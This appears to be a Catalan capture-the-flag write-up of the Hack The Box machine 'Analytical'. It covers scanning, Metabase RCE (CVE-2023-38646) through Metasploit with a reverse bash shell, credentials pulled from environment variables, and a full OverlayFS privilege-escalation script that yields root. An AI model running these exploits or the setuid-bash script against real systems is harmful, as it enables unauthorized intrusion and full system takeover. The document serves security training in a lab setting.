**# 1-Informe (log/bitàcora) amb totes les comandes i procediments realitzats per** **aconseguir vulnerar la màquina. Separarem els procediments segons les fases d'un pentesting.**

Primer comencem amb el **reconeixement**: 

-Primer de tot fem un ping a la màquina amb -c1 per només enviar un paquet:

```
`ping -c1 10.10.11.233

PING 10.10.11.233 (10.10.11.233) 56(84) bytes of data.

64 bytes from 10.10.11.233: icmp_seq=1 ttl=63 time=34.1 ms


--- 10.10.11.233 ping statistics ---

1 packets transmitted, 1 received, 0% packet loss, time 0ms

rtt min/avg/max/mdev = 34.098/34.098/34.098/0.000 ms
````



Veiem que hi ha un TTL que és 63 per tant estem davant una màquina Linux per la proximitat a 64.

  
-Ara fem un traceroute també:


```
`└─# traceroute 10.10.11.233

traceroute to 10.10.11.233 (10.10.11.233), 30 hops max, 60 byte packets

1 * * *

2 * * *

3 * * *

4 * * *

5 * * *

6 * analytical.htb (10.10.11.233) 31.722 ms 32.039 ms
````

  
I veiem el salt intermediari.

-Ara començarem el **reconeixament passiu**, és a dir, mirar quins serveis hiha oberts però sense tirar l’nmap:

Per començar tirem la comanda ssh:

```
`└─# ssh root@10.10.11.233

The authenticity of host '10.10.11.233 (10.10.11.233)' can't be established.

ED25519 key fingerprint is SHA256:TgNhCKF6jUX7MG8TC01/MUj/+u0EBasUVsdSQMHdyfY.

This key is not known by any other names.

Are you sure you want to continue connecting (yes/no/[fingerprint])? yes

Warning: Permanently added '10.10.11.233' (ED25519) to the list of known hosts.

root@10.10.11.233's password:

Permission denied, please try again.

root@10.10.11.233's password:`
```

  

Com que provem password i el servei ens diu que no és correcte sabem que l’ssh funciona, i, al fer només un intent no ens detecten.

Ara podríem mirar un altre port com l’ftp:

``└─# ftp 10.10.11.233``

No tenim resposta i per tant veiem que el port 21 està tancat.

-Podem provar ara mysql a veure si està obert el port:


```
`└─# mysql -u root -h 10.10.11.233 -p
Enter password:`
```

No posem el password perquè no es quedi al history del mysql.

-Podem fer també un wget per descarregar la pàgina index per veure si té una web:

  
```
`└─# wget 10.10.11.233

--2024-01-31 17:53:42-- http://10.10.11.233/

Connecting to 10.10.11.233:80... connected.

HTTP request sent, awaiting response... 302 Moved Temporarily

Location: http://analytical.htb/ [following]

--2024-01-31 17:53:42-- http://analytical.htb/

Resolving analytical.htb (analytical.htb)... failed: Name or service not known.

wget: unable to resolve host address ‘analytical.htb’`
```

  
Aquí veiem que ens dona un 302 com a resposta i ens intenta redirigir cap un domini, llavors veiem que haurem de modificar el fitxer /etc/hosts per dirigir-nos a aquesta web.

-Ara provem de fer un wget al port 443 (https):

```
`└─# wget https://10.10.11.233

--2024-01-31 17:56:53-- https://10.10.11.233/

Connecting to 10.10.11.233:443... failed: Connection refused.`
```

Veiem que el port 443 està tancat.

-Ara provarem de fer una connexió al SMB:

```
`─# smbclient -L 10.10.11.233
do_connect: Connection to 10.10.11.233 failed (Error NT_STATUS_CONNECTION_REFUSED)`
```

Veiem que el port està tancat.

-Ara ja hem acabat el **reconeixement passiu** i començarem amb el **reconeixement actiu** fent un nmap «a seques»:

```
`└─# nmap 10.10.11.233

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-31 17:59 CET

Nmap scan report for 10.10.11.233

Host is up (0.044s latency).

Not shown: 998 closed tcp ports (reset)

PORT STATE SERVICE

22/tcp open ssh

80/tcp open http

Nmap done: 1 IP address (1 host up) scanned in 0.89 seconds`
```

  
Veiem com efectivament el port 22 i el port 80 estan actius.

Seguint amb el reconeixement actiu podem examinar més ports ja que l’nmap sense cap comanda més examina només els 1000 ports més usuals. Ara farem un nmap a tots els ports posant -p-:

```
`└─# nmap -p- 10.10.11.233

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-31 18:01 CET

Nmap scan report for 10.10.11.233

Host is up (0.049s latency).

Not shown: 65523 closed tcp ports (reset)

PORT STATE SERVICE

22/tcp open ssh

80/tcp open http

3070/tcp filtered mgxswitch

6492/tcp filtered unknown

21859/tcp filtered unknown

26289/tcp filtered unknown

31902/tcp filtered unknown

37488/tcp filtered unknown

41198/tcp filtered unknown

47639/tcp filtered unknown

53769/tcp filtered unknown

63460/tcp filtered unknown

  

Nmap done: 1 IP address (1 host up) scanned in 160.12 seconds`
```

  
Amb nmap -Pn i la ip evitaríem que es fes el ping inicial, també seria una bona opció per saltar-nos restricció.

Si volem tirar l’nmap per UDP hem de posar -sU però fer un nmap per UDP és molt lent.

-Ara afegim al fitxer /etc/hosts el domini i la IP de la màquina per poder-hi accedir a través del navegador web amb el nom del domini:

```
`└─# cat /etc/hosts

127.0.0.1 localhost

127.0.1.1 polkali

10.10.11.233 analytical.htb`
```

Hem acabat ja la fase de reconeixement. Ara començarem la **fase d’enumeració**, atacant els ports que ja sabem, a enumerar les versions, ara farem un nmap per poder veure les versions que hi ha darrere de cada port i servei.

Primer farem enumeració a través de la consola i després a través de la web.

-Primer fem un nmap dels dos ports concrets que hem trobat oberts:


```
`└─# nmap -p22,80 -sV 10.10.11.233

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-31 18:20 CET

Nmap scan report for analytical.htb (10.10.11.233)

Host is up (0.047s latency).

PORT STATE SERVICE VERSION

22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)

80/tcp open http nginx 1.18.0 (Ubuntu)

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

Nmap done: 1 IP address (1 host up) scanned in 6.99 seconds`
```

  
Ara veiem les versions que hi ha, per tant ara ja podem buscar a internet si aquests serveis tenen alguna vulnerabilitat.

Ara tornem a fer un nmap amb -sC que són els scripts per defecte i veiem el que ens retorna:

```
`└─# nmap -p22,80 -sC 10.10.11.233

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-31 18:21 CET

Nmap scan report for analytical.htb (10.10.11.233)

Host is up (0.032s latency).

PORT STATE SERVICE

22/tcp open ssh

| ssh-hostkey:

| 256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)

|_ 256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)

80/tcp open http

|_http-title: Analytical

Nmap done: 1 IP address (1 host up) scanned in 2.03 seconds`
```


-Tirarem també el whatweb al domini (és el mateix que el wappalyzer del navegador web).

```
`└─# whatweb analytical.htb

http://analytical.htb [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[demo@analytical.com,due@analytical.com], Frame, HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.233], JQuery[3.0.0], Script, Title[Analytical], X-UA-Compatible[IE=edge], nginx[1.18.0]`
```


El 200 el rebem perquè tenim el domini a l’``/etc/hosts/``. Veiem que utilitza bootstrap, que hi ha uns emails, que fa servir el protocol HTML5, que hi ha un http server a un Ubuntu Linux, veiem que fa servir Jquery, etc.

El whatweb ens ha pogut dir els correus electrònics perquè els ha buscat a la web, de fet amb control + u ens obrirà la pàgina web a una nova pestanya i veurem el codi font, i si fem control + f i busquem per @ veiem com efectivament aquí hi ha els correus:

  

    <div class="col-md-6 padding_0">
          <div class="mail_main">
            <form action="[#](view-source:http://analytical.htb/#)">
              <div class="form-group">
                <input type="text" class="email-bt" placeholder="Name" name="Name">
              </div>
              <div class="form-group">
                <input type="text" class="email-bt" placeholder="Email" name="Email">
              </div>
              <div class="form-group">
                <input type="text" class="email-bt" placeholder="Subject" name="Email">
              </div>
                            
              <div class="form-group">
                <textarea class="massage-bt" placeholder="Massage" rows="5" id="comment" name="text"></textarea>
              </div>
            </form>
            <div class="send_btn">
              <div class="main_bt"><a href="[#](view-source:http://analytical.htb/#)">Send</a></div>
            </div>
            <div class="call_main">
              <div class="left_main">
                <div class="call_text"><img src="[images/call-icon.png](view-source:http://analytical.htb/images/call-icon.png)"><span class="demo_text">(+71) 9876543210</span></div>
              </div>
              <div class="right_main">
                <div class="call_text"><img src="[images/mail-icon.png](view-source:http://analytical.htb/images/mail-icon.png)"><span class="demo_text">due@analytical.com</span></div>
              </div>
            </div>
            <div class="social_icon">
              <ul>
                <li><a href="[#](view-source:http://analytical.htb/#)"><img src="[images/fb-icon.png](view-source:http://analytical.htb/images/fb-icon.png)"></a></li>
                <li><a href="[#](view-source:http://analytical.htb/#)"><img src="[images/twitter-icon.png](view-source:http://analytical.htb/images/twitter-icon.png)"></a></li>
                <li><a href="[#](view-source:http://analytical.htb/#)"><img src="[images/instagram-icon.png](view-source:http://analytical.htb/images/instagram-icon.png)"></a></li>
              </ul>
            </div>
          </div>
        </div>
        <div class="col-md-6 padding_0">
          <div class="map_icon">
            <div class="map_main">
              <div class="map-responsive">
                <iframe src="[https://www.google.com/maps/embed/v1/place?key=AIzaSyA0s1a7phLN0iaD6-UE7m4qP-z21pH0eSc&q=Eiffel+Tower+Paris+France](view-source:https://www.google.com/maps/embed/v1/place?key=AIzaSyA0s1a7phLN0iaD6-UE7m4qP-z21pH0eSc&q=Eiffel+Tower+Paris+France)" width="600" height="580" frameborder="0" style="border:0; width: 100%;" allowfullscreen></iframe>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>
  <!-- contact section end -->  
  <!-- footer section start --> 

![[Pasted image 20240202173503.png]]

Si cliquem un cop som a la pàgina al Login, veiem el subdomini, l’afegim també a l’ /etc/hosts:

```
`└─# cat /etc/hosts

127.0.0.1 localhost

127.0.1.1 polkali

10.10.11.233 analytical.htb

10.10.11.233 data.analytical.htb

The following lines are desirable for IPv6 capable hosts

::1 localhost ip6-localhost ip6-loopback

ff02::1 ip6-allnodes

ff02::2 ip6-allrouters`
```
  
Aquí veiem que ens porta a un login amb el software Metabase i hi fem un whatweb per veure què hi trobem:

![[Pasted image 20240202173621.png]]

```
`┌──(root㉿polkali)-[/home/polkali]

└─# whatweb data.analytical.htb

http://data.analytical.htb [200 OK] Cookies[metabase.DEVICE], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], HttpOnly[metabase.DEVICE], IP[10.10.11.233], Script[application/json], Strict-Transport-Security[max-age=31536000], Title[Metabase], UncommonHeaders[x-permitted-cross-domain-policies,x-content-type-options,content-security-policy], X-Frame-Options[DENY], X-UA-Compatible[IE=edge], X-XSS-Protection[1; mode=block], nginx[1.18.0]`
```

Ara al títol hi veiem metabase que al ser un subdomini la pàgina ha canviat.

Ara buscarem alguna vulnerabilitat de Metabase a internet, veiem que té un CVE: [CVE-2023-38646](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-38646)

L’enumeració s’ha acabat, tenim la versió del sistema operatiu, aquest software que també te un cve.

-Ara comencem la fase **d’explotació**

Ara obrim el Metasploit i fem un search al Metabase, posarem el subdomini en comptes de la IP perquè ataqui el subdomini en comptes del domini:

I trobem que hi ha un exploit:

```
`msf6 > search Metabase

Matching Modules

================

  Name Disclosure Date Rank Check Description

- ---- --------------- ---- ----- -----------

0 exploit/linux/http/metabase_setup_token_rce 2023-07-22 excellent Yes Metabase Setup Token RCE

Interact with a module by name or index. For example info 0, use 0 or use exploit/linux/http/metabase_setup_token_rce

msf6 >`
```

A la configuració amb show options (a port posem el 80 que és l’http):

```
`sf6 exploit(linux/http/metabase_setup_token_rce) > show options

Module options (exploit/linux/http/metabase_setup_token_rce):

Name Current Setting Required Description

---- --------------- -------- -----------

Proxies no A proxy chain of format type:host:port[,type:host:port][...]

RHOSTS data.analytical.htb yes The target host(s), see https://docs.metasploit.com/docs/using-metasplo

it/basics/using-metasploit.html

RPORT 80 yes The target port (TCP)

SSL false no Negotiate SSL/TLS for outgoing connections

TARGETURI / yes The URI of the Metabase Application

VHOST no HTTP server virtual host

Payload options (cmd/unix/reverse_bash):

Name Current Setting Required Description

---- --------------- -------- -----------

LHOST 10.10.14.183 yes The listen address (an interface may be specified)

LPORT 4444 yes The listen port

  
Exploit target:

Id Name

-- ----
0 Automatic Target`
```

  
Ara fem run i ja estem dins:

```
`msf6 exploit(linux/http/metabase_setup_token_rce) > run

[*] Started reverse TCP handler on 10.10.14.183:4444

[*] Running automatic check ("set AutoCheck false" to disable)

[+] The target appears to be vulnerable. Version Detected: 0.46.6

[+] Found setup token: 249fa03d-fd94-4d5b-b94f-b4ebf3df681f

[*] Sending exploit (may take a few seconds)

[*] Command shell session 1 opened (10.10.14.183:4444 -> 10.10.11.233:43142) at 2024-01-31 19:21:58 +0100`
```

  
-Ara estem a la fase de **post-explotació**:

```
`id

uid=2000(metabase) gid=2000(metabase) groups=2000(metabase),2000(metabase)

whoami

metabase`
```

-Si posem la comanda hostname veiem que estem a un contenidor:

```
`hostname

6df4a1828569`
```

-Ara posem la comanda ENV i veiem el següent:

```
`env

MB_LDAP_BIND_DN=
LANGUAGE=en_US:en
USER=metabase
HOSTNAME=6df4a1828569
FC_LANG=en-US
SHLVL=5
LD_LIBRARY_PATH=/opt/java/openjdk/lib/server:/opt/java/openjdk/lib:/opt/java/openjdk/../lib
HOME=/home/metabase
OLDPWD=/home
MB_EMAIL_SMTP_PASSWORD=
LC_CTYPE=en_US.UTF-8
JAVA_VERSION=jdk-11.0.19+7
LOGNAME=metabase
_=/bin/sh
MB_DB_CONNECTION_URI=
PATH=/opt/java/openjdk/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
MB_DB_PASS=
MB_JETTY_HOST=0.0.0.0
META_PASS=An4lytics_ds20223#
LANG=en_US.UTF-8
MB_LDAP_PASSWORD=
SHELL=/bin/sh
MB_EMAIL_SMTP_USERNAME=
MB_DB_USER=
META_USER=metalytics
LC_ALL=en_US.UTF-8
JAVA_HOME=/opt/java/openjdk
PWD=/home/metabase
MB_DB_FILE=//metabase.db/metabase.db`
```
``

Aquí veiem que hi ha l’usuari META_USER=metalytics i la password An4lytics_ds20223# . Com que hem vist que hi ha connexió ssh a la màquina provarem de connectar-nos-hi amb aquestes credencials:

  
```
`ssh metalytics@10.10.11.233

metalytics@10.10.11.233's password:

Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 6.2.0-25-generic x86_64)


* Documentation: https://help.ubuntu.com

* Management: https://landscape.canonical.com

* Support: https://ubuntu.com/advantage

  

System information as of Wed Jan 31 06:31:06 PM UTC 2024

  
System load: 0.31201171875 Processes: 345

Usage of /: 94.2% of 7.78GB Users logged in: 1

Memory usage: 32% IPv4 address for docker0: 172.17.0.1

Swap usage: 0% IPv4 address for eth0: 10.10.11.233


=> / is using 94.2% of 7.78GB

=> There are 147 zombie processes.

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.


Enable ESM Apps to receive additional future security updates.

See https://ubuntu.com/esm or run: sudo pro status

The list of available updates is more than a week old.

To check for new updates run: sudo apt update

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Wed Jan 31 18:16:25 2024 from 10.10.14.208

metalytics@analytics:~$`
```


Ens ha funcionat correctament i hem obtingut accés amb l’usuari metalytics i ara anem al home per obtenir la **flag de l'user** del fitxer user.txt:

``metalytics@analytics:~$ cd /home

metalytics@analytics:/home$ ls

metalytics

metalytics@analytics:/home$ cd metalytics/

metalytics@analytics:~$ ls

exploit.sh l linpeas.sh m u user.txt w

metalytics@analytics:~$ cat user.txt

7bb654b686d61b2a22769b84865ed047

metalytics@analytics:~$``

-Amb la comanda uname -a veiem el següent:

```
`uname -a

Linux 6df4a1828569 6.2.0-25-generic #25~22.04.2-Ubuntu SMP PREEMPT_DYNAMIC Wed Jun 28 09:55:23 UTC 2 x86_64 Linux`
```


Si agafem i copiem des del coixinet a internet amb el navegador podrem trobar un CVE per tenir permisos d’administrador i trobem aquest exploit:

[https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629/blob/main/exploit.sh](https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629/blob/main/exploit.sh)

I ara creem un directori i hi posem l’exploit a dins, creem el fitxer amb nano exploit.sh:

``metalytics@analytics:~/MARTIKO$ cat exploit.sh``

```
`#!/bin/bash

CVE-2023-2640 CVE-2023-3262: GameOver(lay) Ubuntu Privilege Escalation

by g1vi https://github.com/g1vi

October 2023

  
echo "[+] You should be root now"

echo "[+] Type 'exit' to finish and leave the house cleaned"


unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("cp /bin/bash /var/tmp/bash && chmod 4755 /var/tmp/bash && /var/tmp/bash -p && rm -rf l m u w /var/tmp/bash")'`
```

Li donem permisos d’execució:

```
metalytics@analytics:~/MARTIKO$ chmod +x exploit.sh

metalytics@analytics:~/MARTIKO$
````
  

I ara l’executem i ja obtenim accés com a **usuari root**. Ara podem anar a /root i aconseguir la flag root.txt.

```
root@analytics:~# mkdir tv

root@analytics:~# cd tv

root@analytics:~/tv# nano mi.sh

root@analytics:~/tv# sh ./mi.sh

[+] You should be root now

[+] Type 'exit' to finish and leave the house cleaned

cp: cannot create regular file '/var/tmp/bash': Text file busy

root@analytics:~/tv# ls -lah

total 28K

drwxrwxr-x 6 root metalytics 4.0K Jan 31 18:54 .

drwxr-x--- 11 metalytics metalytics 4.0K Jan 31 18:54 ..

drwxrwxr-x 2 root metalytics 4.0K Jan 31 18:54 l

drwxrwxr-x 2 root metalytics 4.0K Jan 31 18:54 m

-rw-rw-r-- 1 root metalytics 558 Jan 31 18:54 mi.sh

drwxrwxr-x 2 root metalytics 4.0K Jan 31 18:54 u

drwxrwxr-x 3 root metalytics 4.0K Jan 31 18:54 w

root@analytics:~/tv# cd ..

root@analytics:~# ls -lah

total 72K

drwxr-x--- 11 metalytics metalytics 4.0K Jan 31 18:54 .

drwxr-xr-x 3 root root 4.0K Aug 8 11:37 ..

lrwxrwxrwx 1 root root 9 Aug 3 16:23 .bash_history -> /dev/null

-rw-r--r-- 1 metalytics metalytics 220 Aug 3 08:53 .bash_logout

-rw-r--r-- 1 metalytics metalytics 3.7K Aug 3 08:53 .bashrc

drwx------ 2 metalytics metalytics 4.0K Aug 8 11:37 .cache

-rw-rw-r-- 1 metalytics metalytics 558 Jan 31 18:53 exploit.sh

drwx------ 3 metalytics metalytics 4.0K Jan 31 18:32 .gnupg

drwxrwxr-x 2 metalytics metalytics 4.0K Jan 31 18:54 l

drwxrwxr-x 3 metalytics metalytics 4.0K Aug 8 11:37 .local

drwxrwxr-x 2 metalytics metalytics 4.0K Jan 31 18:54 m

drwxrwxr-x 6 metalytics metalytics 4.0K Jan 31 18:54 pep

-rw-r--r-- 1 metalytics metalytics 807 Aug 3 08:53 .profile

-rw------- 1 metalytics metalytics 7 Jan 31 18:30 .python_history

drwxrwxr-x 6 root metalytics 4.0K Jan 31 18:54 tv

drwxrwxr-x 2 metalytics metalytics 4.0K Jan 31 18:54 u

-rw-r----- 1 root metalytics 33 Jan 31 18:26 user.txt

-rw-r--r-- 1 metalytics metalytics 39 Aug 8 11:30 .vimrc

drwxrwxr-x 3 metalytics metalytics 4.0K Jan 31 18:54 w

root@analytics:~# cat /root/

.bash_history .cache/ .profile .scripts/ .ssh/ .wget-hsts

.bashrc .local/ root.txt .selected_editor .vimrc

root@analytics:~# cat /root/root.txt

94ec0a4bd3dba4a529ddf8bb03f4fc75

root@analytics:~# Terminated`
```

